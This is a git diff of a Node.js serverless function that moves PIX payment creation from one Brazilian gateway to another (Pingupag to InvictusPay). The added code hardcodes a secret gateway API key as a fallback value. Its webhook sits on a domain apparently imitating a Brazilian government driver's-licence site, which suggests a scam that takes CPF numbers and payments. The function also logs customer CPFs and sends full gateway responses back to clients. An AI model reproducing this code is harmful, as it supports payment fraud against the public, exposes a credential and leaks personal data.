@@ -1,8 +1,8 @@
 const { getSupabase } = require("./lib/supabase");
 const credentials = require("./credentials");
 
-const PINGUPAG_BASE = "https://app.pingupag.com/gateway/v1";
-const PINGUPAG_API_KEY = process.env.PINGUPAG_API_KEY || credentials.PINGUPAG_API_KEY;
+const INVICTUSPAY_BASE = "https://api.invictuspayv2.com.br/api/v1";
+const INVICTUSPAY_API_KEY = process.env.INVICTUSPAY_API_KEY || credentials.INVICTUSPAY_API_KEY || "sk_XeHEPgVYP5hSDktcwBniLI1tu6zdTIhQpvSZyVeU2uBj1xuk6TszDHFy";
 const UTMIFY_TOKEN = process.env.UTMIFY_TOKEN || credentials.UTMIFY_TOKEN;
 const SUPABASE_URL = process.env.NEXT_PUBLIC_SUPABASE_URL;
 const SUPABASE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
@@ -12,10 +12,10 @@ const utmifyCache = new Map();
 const CACHE_TTL = 60000;
 
 function getAuthHeader() {
-  if (!PINGUPAG_API_KEY) {
-    throw new Error("❌ PINGUPAG_API_KEY não configurada!");
+  if (!INVICTUSPAY_API_KEY) {
+    throw new Error("❌ INVICTUSPAY_API_KEY não configurada!");
   }
-  return PINGUPAG_API_KEY;
+  return INVICTUSPAY_API_KEY;
 }
 
 async function sendUtmify(transactionId, status, customer, amountCents, createdAt, utms) {
@@ -32,7 +32,7 @@ async function sendUtmify(transactionId, status, customer, amountCents, createdA
     const netCents = amountCents - gatewayFeeCents;
     const payload = {
       orderId: transactionId,
-      platform: "Pingupag",
+      platform: "InvictusPay",
       paymentMethod: "pix",
       status,
       createdAt: createdAt || new Date().toISOString().replace("T"," ").slice(0,19),
@@ -128,17 +128,17 @@ function fmtPhone(phone) {
 }
 
 exports.handler = async (event) => {
-  console.log("[PIX-PINGUPAG] ===== FUNÇÃO INICIADA =====");
-  console.log("[PIX-PINGUPAG] PINGUPAG_API_KEY exists:", !!PINGUPAG_API_KEY);
-  console.log("[PIX-PINGUPAG] SUPABASE_URL exists:", !!SUPABASE_URL);
-  console.log("[PIX-PINGUPAG] SUPABASE_KEY exists:", !!SUPABASE_KEY);
+  console.log("[PIX-INVICTUSPAY] ===== FUNÇÃO INICIADA =====");
+  console.log("[PIX-INVICTUSPAY] INVICTUSPAY_API_KEY exists:", !!INVICTUSPAY_API_KEY);
+  console.log("[PIX-INVICTUSPAY] SUPABASE_URL exists:", !!SUPABASE_URL);
+  console.log("[PIX-INVICTUSPAY] SUPABASE_KEY exists:", !!SUPABASE_KEY);
   
-  if (!PINGUPAG_API_KEY) {
-    console.error("❌ ERRO: PINGUPAG_API_KEY não configurada na Netlify!");
+  if (!INVICTUSPAY_API_KEY) {
+    console.error("❌ ERRO: INVICTUSPAY_API_KEY não configurada!");
     return jsonResponse(500, {
       success: false,
       error: "Credenciais da gateway não configuradas",
-      debug: "PINGUPAG_API_KEY não encontrada"
+      debug: "INVICTUSPAY_API_KEY não encontrada"
     });
   }
 
@@ -180,28 +180,30 @@ exports.handler = async (event) => {
   const utms = body.utm || {};
   const reference = `order_${randId}`;
 
-  console.log("[PIX-PINGUPAG] Amount:", amountReais, "Cents:", amountCents);
-  console.log("[PIX-PINGUPAG] Customer:", { name: customerName, email: customerEmail, cpf: customerCpf });
+  console.log("[PIX-INVICTUSPAY] Amount:", amountReais, "Cents:", amountCents);
+  console.log("[PIX-INVICTUSPAY] Customer:", { name: customerName, email: customerEmail, cpf: customerCpf });
 
-  // Payload para Pingupag
+  // Payload para InvictusPay - Seguindo a documentação
   const payload = {
-    amount: amountCents,
-    description: "SHOPIFY LOJA 03",
-    reference,
-    source: "api_externa",
+    amount: amountCents, // em centavos
+    paymentMethod: "pix",
     customer: {
       name: customerName,
       email: customerEmail,
+      document: customerCpf, // CPF/CNPJ
       phone: customerPhone,
-      document: customerCpf,
     },
-    postback_url: "https://cnh-brasil-gov-br.netlify.app/webhook/pingupag",
-    tracking: {
-      utm_source: utms.utm_source || null,
-      utm_campaign: utms.utm_campaign || null,
-      utm_medium: utms.utm_medium || null,
-      utm_content: utms.utm_content || null,
-      utm_term: utms.utm_term || null,
+    items: [
+      {
+        description: "SHOPIFY LOJA 03",
+        quantity: 1,
+        amount: amountCents,
+        externalRef: reference,
+      }
+    ],
+    postbackUrl: "https://cnh-brasil-gov-br.netlify.app/webhook/invictuspay",
+    pix: {
+      expirationInSeconds: 1800, // 30 minutos
     },
   };
 
@@ -209,7 +211,7 @@ exports.handler = async (event) => {
   try {
     apiKey = getAuthHeader();
   } catch (err) {
-    console.error("❌ [PIX-PINGUPAG] Auth error:", err.message);
+    console.error("❌ [PIX-INVICTUSPAY] Auth error:", err.message);
     return jsonResponse(500, {
       success: false,
       error: "Credenciais não configuradas",
@@ -221,11 +223,11 @@ exports.handler = async (event) => {
     const controller = new AbortController();
     const timeout = setTimeout(() => controller.abort(), 30000);
     
-    const resp = await fetch(`${PINGUPAG_BASE}/transaction`, {
+    const resp = await fetch(`${INVICTUSPAY_BASE}/transactions`, {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
-        "X-API-Key": apiKey,
+        "X-Api-Key": apiKey,
       },
       body: JSON.stringify(payload),
       signal: controller.signal,
@@ -236,7 +238,7 @@ exports.handler = async (event) => {
     if (!resp.ok) {
       let errMsg = text;
       try { errMsg = JSON.parse(text)?.message || errMsg; } catch {}
-      console.error("[Pingupag] Erro HTTP:", resp.status, errMsg);
+      console.error("[InvictusPay] Erro HTTP:", resp.status, errMsg);
       return jsonResponse(resp.status, {
         success: false,
         error: errMsg,
@@ -246,7 +248,7 @@ exports.handler = async (event) => {
 
     let parsed = {};
     try { parsed = JSON.parse(text); } catch {
-      console.error("[Pingupag] Parse error:", text.substring(0, 200));
+      console.error("[InvictusPay] Parse error:", text.substring(0, 200));
       return jsonResponse(500, {
         success: false,
         error: "Resposta inválida da gateway",
@@ -254,21 +256,28 @@ exports.handler = async (event) => {
       });
     }
 
-    const transactionId = parsed.transaction_id || parsed.id || null;
-    const pixCode = parsed.qr_code || null;
+    // InvictusPay retorna transaction.id (ULID)
+    const transactionId = parsed.transaction?.id || parsed.id || null;
+    
+    // PIX pode estar em: transaction.pix.qr_code ou transaction.pix.brcode
+    const pixCode = parsed.transaction?.pix?.qr_code 
+      || parsed.transaction?.pix?.brcode 
+      || parsed.pix?.qr_code 
+      || parsed.qr_code 
+      || null;
 
     if (!transactionId || !pixCode) {
-      console.error("[Pingupag] Resposta incompleta:", { transactionId, pixCode });
+      console.error("[InvictusPay] Resposta incompleta:", { transactionId, pixCode });
       return jsonResponse(500, {
         success: false,
         error: "Gateway retornou resposta incompleta",
-        debug: { transaction: transactionId, pix: !!pixCode }
+        debug: { transaction: transactionId, pix: !!pixCode, fullResponse: parsed }
       });
     }
 
-    console.log("[PIX-PINGUPAG] ===== PIX GERADO COM SUCESSO =====");
-    console.log("[PIX-PINGUPAG] Transaction ID:", transactionId);
-    console.log("[PIX-PINGUPAG] PIX Code: ✓ Existe");
+    console.log("[PIX-INVICTUSPAY] ===== PIX GERADO COM SUCESSO =====");
+    console.log("[PIX-INVICTUSPAY] Transaction ID:", transactionId);
+    console.log("[PIX-INVICTUSPAY] PIX Code: ✓ Existe");
 
     // Salvar no Supabase (não bloqueia)
     if (SUPABASE_URL && SUPABASE_KEY) {
@@ -283,7 +292,7 @@ exports.handler = async (event) => {
           customer_phone: customerPhone,
           status: "pending",
           brcode: pixCode,
-          gateway: "pingupag",
+          gateway: "invictuspay",
           utm_source: utms.utm_source || null,
           utm_campaign: utms.utm_campaign || null,
           utm_medium: utms.utm_medium || null,
@@ -316,10 +325,11 @@ exports.handler = async (event) => {
       deposit_id: transactionId,
       status: "pending",
       amount: amountReais,
+      gateway: "invictuspay",
     });
 
   } catch (err) {
-    console.error("[PIX-PINGUPAG] Erro ao chamar gateway:", err.message);
+    console.error("[PIX-INVICTUSPAY] Erro ao chamar gateway:", err.message);
     return jsonResponse(502, {
       success: false,
       error: "Falha ao conectar com gateway: " + String(err)
